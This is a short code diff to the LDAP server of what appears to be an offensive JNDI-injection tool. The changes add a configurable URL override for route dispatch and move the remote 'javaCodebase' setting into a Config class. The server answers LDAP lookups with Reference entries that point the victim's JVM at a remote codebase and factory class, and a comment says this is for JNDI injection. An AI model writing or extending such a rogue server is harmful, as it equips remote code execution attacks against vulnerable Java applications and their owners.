@@ -1,5 +1,6 @@
 package map.jndi.server;
 
+import map.jndi.Config;
 import map.jndi.Dispatcher;
 import map.jndi.Main;
 import map.jndi.util.SerializeUtil;
@@ -58,8 +59,15 @@ public class LDAPServer implements Runnable {
             String path = "/" + base.split(",")[0]; // 获取路由
 
             System.out.println("[LDAP] Send result for " + path);
+
             // 路由分发, 为其匹配对应的 Controller 和方法
-            Object result = Dispatcher.getInstance().service(path);
+            Object result;
+
+            if (Config.url != null) {
+                result = Dispatcher.getInstance().service(Config.url);
+            } else {
+                result = Dispatcher.getInstance().service(path);
+            }
 
             e.addAttribute("javaClassName", "foo");
 
@@ -72,7 +80,7 @@ public class LDAPServer implements Runnable {
             } else {
                 // 返回 Reference 对象, 指定 codebase, 用于常规 JNDI 注入
                 e.addAttribute("objectClass", "javaNamingReference");
-                e.addAttribute("javaCodebase", Main.codebase);
+                e.addAttribute("javaCodebase", Config.codebase);
                 e.addAttribute("javaFactory", (String) result);
             }
 
